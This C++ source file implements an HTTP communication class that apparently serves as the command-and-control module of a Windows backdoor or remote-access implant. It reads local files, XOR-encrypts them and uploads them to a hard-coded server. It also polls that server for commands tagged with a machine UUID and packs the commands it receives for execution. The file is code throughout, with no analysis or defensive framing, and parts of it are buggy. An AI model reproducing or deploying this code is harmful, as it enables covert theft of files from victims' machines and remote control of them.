
#include <winsock.h>
#include "http.h"
#include "FileHelper.h"
#include "public.h"
#include "utils.h"

#include "https.h"

#include "packet.h"
#include "base64.h"
#include "command.h"

HttpProto::HttpProto() {

}

HttpProto::HttpProto(int action) {

	wcscpy_s(m_app, sizeof(m_app) / sizeof(WCHAR), MY_PHP_SERVER);

	in_addr ia;
	ia.S_un.S_addr = g_ip;
	string strip = inet_ntoa(ia);

	mbstowcs(m_ip, strip.c_str(), sizeof(m_ip) / sizeof(WCHAR));

    if (action )
    {
        m_action = L"POST";
    }
    else {
        m_action = L"GET";
    }
    
	m_port = HTTP_PORT;
}

HttpProto::HttpProto(wchar_t* ip, unsigned short port, wchar_t* app)
{
	m_port = port;
	wcscpy_s(m_ip, sizeof(m_ip) / sizeof(WCHAR), ip);

	wcscpy_s(m_app, sizeof(m_app) / sizeof(WCHAR), MY_PHP_SERVER);

	//m_boundary = BuildBoundary(bound);
	m_boundary = L"ThisIsMyBoundary";

	m_resp = 0;
	m_respLen = 0;
}


HttpProto::~HttpProto()
{
	if (m_resp)
	{
		delete m_resp;
		m_resp = 0;
	}
	if (m_inCmd)
	{
		delete m_inCmd;
		m_inCmd = 0;
	}
}

tstring& HttpProto::BuildBoundary(tstring& bdrout)
{
    char tickCount[32] = { 0x0 };
    ULONGLONG tc = GetTickCount64();
    _ltoa_s((long)tc, tickCount, 16);
    std::string astr("--------");
    astr.append(tickCount);
#ifdef _UNICODE
    string2wstring(astr, bdrout);
#else
    bdrout = tickCount;
#endif 
    return bdrout;
}

/*
    Build the pararmeter string that matchs the post type 'File'(i take this type from fiddler)
    At here,we assume that we will post the binary file,so the default Content-Disposition is octet-stream
    and all of the data will be set to ASCII

    Format:
    --boundary
    Content-Type: form-data; name="key"; filename="filename"
    Content-Dispostion: octet-stream

    data
    --boundary

    Note that the boundary string has two extern '-' before it,see the detail in WinHttpPost.h References section
*/

std::string& HttpProto::BuildFileParamString(std::string& key, std::string& value, std::string& paramstr)
{
    std::string temp;
#ifdef _UNICODE
    wstring2string(m_boundary, temp);
    paramstr.append("--").append(temp).append("\r\n");
#else
    paramstr.append("--").append(m_boundary).append("\r\n");
#endif
    paramstr.append("Content-Type: form-data; name=\"")
        .append(key).append("\"")
        .append("; filename=\"").append(value).append("\"").append("\r\n")
        .append("Content-Disposition: octet-stream").append("\r\n\r\n");
    return paramstr;
}

std::string& HttpProto::BuildOtherParamString(std::string& key, std::string& value, std::string& paramstr)
{
    std::string temp;
#ifdef _UNICODE
    wstring2string(m_boundary, temp);
    paramstr.append("--").append(temp).append("\r\n");
#else
    paramstr.append("--").append(m_boundary).append("\r\n");
#endif
    paramstr.append("Content-Disposition: form-data; name=\"")
        .append(key).append("\"").append("\r\n\r\n").append(value).append("\r\n");
    return paramstr;
}

std::string& HttpProto::BuildEndBoundaryString(std::string& endflag)
{
    std::string temp;
#ifdef _UNICODE
    wstring2string(m_boundary, temp);
    endflag.append("--").append(temp).append("--");
#else
    endflag.append("--").append(m_boundary).append("--");
#endif
    return endflag;
}

std::wstring& HttpProto::BuildHeaderContentType(std::wstring& strout)
{
    if (m_boundary.empty()) {
        return strout;
    }

#ifdef _UNICODE
    strout.append(L"Content-Type: multipart/form-data; boundary=").append(m_boundary);
#else
    std::wstring tmp;
    string2wstring(m_boundary, tmp);
    strout.append(L"Content-Type: multipart/form-data; boundary=").append(tmp);
#endif

    return strout;
}




std::wstring& HttpProto::BuildContentLength(unsigned long length, std::wstring& lengthstr)
{
    lengthstr.append(L"Content-Length: ").append(std::to_wstring(length));
    return lengthstr;
}




unsigned long HttpProto::BuildPostEntity(char* filebuf, unsigned long filesize, const char* filename, char** entity)
{
    if (filebuf == 0 || filesize == 0 || filename == 0 || strlen(filename) == 0) {
        return 0;
    }

    std::string file_param;
    std::string file_param_key("file");
    std::string file_param_value(filename);
    BuildFileParamString(file_param_key, file_param_value, file_param);

    std::string filename_param;
    std::string filename_param_key("filename");
    std::string filename_param_value(filename);
    BuildOtherParamString(filename_param_key, filename_param_value, filename_param);

    std::string endmime;
    BuildEndBoundaryString(endmime);

    unsigned long totallen = file_param.length() + filesize + filename_param.length() + endmime.length();
    *entity = new char[totallen];
    ZeroMemory(*entity, totallen);

    unsigned long offset = 0;
    memcpy_s(*entity, totallen, file_param.c_str(), file_param.length());
    offset += file_param.length();

    memcpy_s(*entity + offset, totallen, filebuf, filesize);
    offset += filesize;

    memcpy_s(*entity + offset, totallen, filename_param.c_str(), filename_param.length());
    offset += filename_param.length();

    memcpy_s(*entity + offset, totallen, endmime.c_str(), endmime.length());
    return totallen;
}


unsigned long makeFileEntity(char* filebuf, unsigned long filesize, const char* filename, char** entity) {
	int totallen = 4 + 4 + 1 + 16 + filesize + 4;
	*entity = new char[(ULONGLONG)totallen + 1024];
	ZeroMemory(*entity, totallen);
	int offset = 0;
	memcpy_s(*entity + offset, totallen, "Data", 4);
	offset += 4;

	memcpy_s(*entity + offset, totallen, "$$31", 4);
	offset += 4;

	const char* strip = "&192.168.131.001 ";
	int striplen = lstrlenA(strip);
	memcpy_s(*entity + offset, totallen, strip, striplen);
	offset += striplen;

	memcpy_s(*entity + offset, totallen, filebuf, filesize);
	offset += filesize;

	memcpy_s(*entity + offset, totallen, "Data", 4);
	offset += 4;

	return totallen;
}



bool HttpProto::httpRequest(char* data, int datasize)
{
	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
	BOOL opSuccess = FALSE;
	DWORD btsWritten = 0, size_ = 0, btsRead = 0;
	bool sendok = true;

	hSession = WinHttpOpen(MY_USERAGENT, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (!hSession) {
		sendok = false;
		return sendok;
	}

	hConnect = WinHttpConnect(hSession, m_ip, m_port, 0);
	if (!hConnect) {
		sendok = false;
		return sendok;
	}

	hRequest = WinHttpOpenRequest(hConnect, m_action.c_str(), m_app, 0, WINHTTP_NO_REFERER, NULL, 0);        //WINHTTP_NO_REFERER
	if (!hRequest) {
		sendok = false;
		return sendok;
	}

	DWORD dwOption = WINHTTP_DECOMPRESSION_FLAG_ALL;
	DWORD dwL = sizeof(dwOption);
	opSuccess = WinHttpSetOption(hRequest, WINHTTP_OPTION_DECOMPRESSION, &dwOption, dwL);

	opSuccess = GetLastError();

	//     opSuccess = WinHttpAddRequestHeaders(hRequest, L"Expect:100-continue", -1L, 0);
	//     if (!hRequest) {
	//         sendok = false;
	//         return sendok;
	//     }

	//     std::wstring ct;
	//     BuildHeaderContentType(ct);
	//     opSuccess = WinHttpAddRequestHeaders(hRequest, ct.c_str(), -1L, 0);
	//     if (!opSuccess) {
	//         sendok = false;
	//         return sendok;
	//     }

	std::wstring cl;
	BuildContentLength(datasize, cl);
	opSuccess = WinHttpAddRequestHeaders(hRequest, cl.c_str(), -1L, 0);
	if (!opSuccess) {
		sendok = false;
		return sendok;
	}

	opSuccess = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, datasize, 0);
	if (!opSuccess) {
		sendok = false;
		return sendok;
	}

	if (data && datasize)
	{
		xor_crypt(data, datasize);

		opSuccess = WinHttpWriteData(hRequest, data, datasize, &btsWritten);
		if (!opSuccess) {
			sendok = false;
			return sendok;
		}
	}

	opSuccess = WinHttpReceiveResponse(hRequest, 0);
	if (!opSuccess) {
		sendok = false;
		return sendok;
	}

	vector<char*> response;
	int respLen = 0;
	opSuccess = WinHttpQueryDataAvailable(hRequest, &size_);
	if (size_ > 0 && opSuccess) {
		int freesize = BUFFER_SIZE;
		char* databuf = new char[BUFFER_SIZE];
		response.push_back(databuf);

		while (opSuccess && size_ > 0)
		{
			if (size_ > freesize)
			{
				opSuccess = WinHttpReadData(hRequest, databuf, freesize, &btsRead);
			}
			else
			{
				opSuccess = WinHttpReadData(hRequest, databuf, size_, &btsRead);
			}
			if (opSuccess == 0 || btsRead <= 0)
			{
				break;
			}

			databuf += btsRead;
			freesize -= btsRead;
			respLen += btsRead;
			if (freesize <= 0)
			{
				freesize = BUFFER_SIZE;
				databuf = new char[BUFFER_SIZE];
				response.push_back(databuf);
			}

			opSuccess = WinHttpQueryDataAvailable(hRequest, &size_);
		}
	}

	if (response.size() >0 && respLen > 0)
	{
		if (m_resp)
		{
			delete m_resp;
			m_resp = 0;
		}
		m_resp = new char[response.size() * BUFFER_SIZE + 16];
		char* ptr = m_resp;
		m_respLen = respLen;
		for (int i = 0; i < response.size(); i++)
		{
			memcpy(ptr, response[i], BUFFER_SIZE);
			ptr += BUFFER_SIZE;
			delete response[i];
		}
	}

	if (hSession) {
		WinHttpCloseHandle(hSession);
	}

	if (hConnect) {
		WinHttpCloseHandle(hConnect);
	}

	if (hRequest) {
		WinHttpCloseHandle(hRequest);
	}
	return sendok;
}


bool HttpProto::postTest(string filename,char * pfilebuffer,int filesize)
{
    int ret = 0;
	char * postentity = 0;
	unsigned long  entitysize = 0;

	//entitysize = BuildPostEntity(pfilebuffer, filesize, filename.c_str(), &postentity);
	entitysize = makeFileEntity(pfilebuffer, filesize, filename.c_str(), &postentity);
    ret = httpRequest(postentity, entitysize);

	return ret;
}




int uploadFileTest(const char* filename) {

    int ret = 0;

    char* file = 0;
    int filesize = 0;
    ret = FileHelper::fileReader(filename, &file, &filesize);
    if (ret > 0)
    {
		WCHAR strapp[MAX_SIZE];
		wcscpy_s(strapp, sizeof(strapp) / sizeof(WCHAR), MY_PHP_SERVER);

		in_addr ia;
		ia.S_un.S_addr = g_ip;
		string strip = inet_ntoa(ia);

		WCHAR wstrip[256];
		mbstowcs(wstrip, strip.c_str(), sizeof(wstrip) / sizeof(WCHAR));

		if (g_httpsToggle)
		{
			HttpsProto https(wstrip, HTTPS_PORT, strapp);

			https.postTest(filename, file, filesize);
		}
		else {
			HttpProto http(wstrip, HTTP_PORT, strapp);

			http.postTest(filename, file, filesize);
		}

        delete []file;
    }
    return ret;
}



bool HttpProto::setUrl(wstring url) {
	int ret = 0;

	wcscpy(m_app, url.c_str());

	return ret;
}


bool HttpProto::setPort(USHORT port) {
	m_port = port;
	return TRUE;
}

bool HttpProto::setIP(USHORT port) {
	in_addr ia;
	ia.S_un.S_addr = g_ip;
	string strip = inet_ntoa(ia);
	mbstowcs(m_ip, strip.c_str(), sizeof(m_ip) / sizeof(WCHAR));
	return TRUE;
}


bool HttpProto::getCmd(const char* cmd) {
    int ret = 0;

	WCHAR url[1024];
	WCHAR wstruuid[64];
	mbstowcs(wstruuid, g_uuid, sizeof(wstruuid)/sizeof(WCHAR));
    WCHAR wstrcmd[16];
    mbstowcs(wstrcmd, cmd, sizeof(wstrcmd) / sizeof(WCHAR));

//     CHAR app[1024];
//     wcstombs(app, MY_PHP_SERVER, sizeof(app));
//     char strurl[1024];
//     char pack[1024];
// 	int firstlen = wsprintfA(strurl, "%s?Data%s", app, cmd);
//     strurl[firstlen++] = g_uuid_len;
// 	wsprintfA(strurl + firstlen, "%sData", g_uuid);
//     string base64 = base64_encode((unsigned char const* )strurl, lstrlenA(strurl));
//     mbstowcs(url, base64.c_str(), sizeof(url) / sizeof(WCHAR));

    int firstlen = wsprintfW(url, L"%ws?Data%ws", MY_PHP_SERVER, wstrcmd);
    url[firstlen ++] = g_uuid_len;
    wsprintfW(url + firstlen, L"%wsData", wstruuid);
    
    setUrl(url);
   
    ret = httpRequest(0, 0);
    return ret;
}



bool HttpProto::getCmdStr(const char* cmd,const char * str) {
	int ret = 0;

	WCHAR wstruuid[64];
	mbstowcs(wstruuid, g_uuid, sizeof(wstruuid) / sizeof(WCHAR));

	WCHAR wstrcmd[16];
	mbstowcs(wstrcmd, cmd, sizeof(wstrcmd) / sizeof(WCHAR));

	WCHAR wstrstr[16];
	mbstowcs(wstrstr, str, sizeof(wstrstr) / sizeof(WCHAR));

    WCHAR url[1024];
	int firstlen = wsprintfW(url, L"%ws?Data%ws", MY_PHP_SERVER, wstrcmd);
	url[firstlen++] = g_uuid_len;
	int secondlen = wsprintfW(url + firstlen, L"%ws", wstruuid);

    int stringlen = lstrlenA(str);
	url[firstlen + secondlen] = stringlen;
	wsprintfW(url + firstlen + secondlen+1, L"%wsData", wstrstr);

	setUrl(url);

	ret = httpRequest(0, 0);
	return ret;
}


bool HttpProto::getSubCmd(const char* cmd, const char* subcmd) {
	int ret = 0;

	WCHAR url[1024];

	WCHAR wstrsubcmd[16];
	mbstowcs(wstrsubcmd, subcmd, sizeof(wstrsubcmd) / sizeof(WCHAR));

	WCHAR wstrcmd[16];
	mbstowcs(wstrcmd, cmd, sizeof(wstrcmd) / sizeof(WCHAR));

	int firstlen = wsprintfW(url, L"%ws?Data%ws%wsData", MY_PHP_SERVER, wstrcmd, wstrsubcmd);

	setUrl(url);

	ret = httpRequest(0, 0);
	return ret;
}




int HttpProto::setInnerCmd(char* data, int datalen, int type) {

    m_inCmd = new char[datalen + sizeof(MY_CMD_PACKET) + 16];
	MY_CMD_PACKET* mypack = (MY_CMD_PACKET*)m_inCmd;
	mypack->len = datalen;
	mypack->type = type;
	memcpy(mypack->value, data, datalen);
    return 0;
}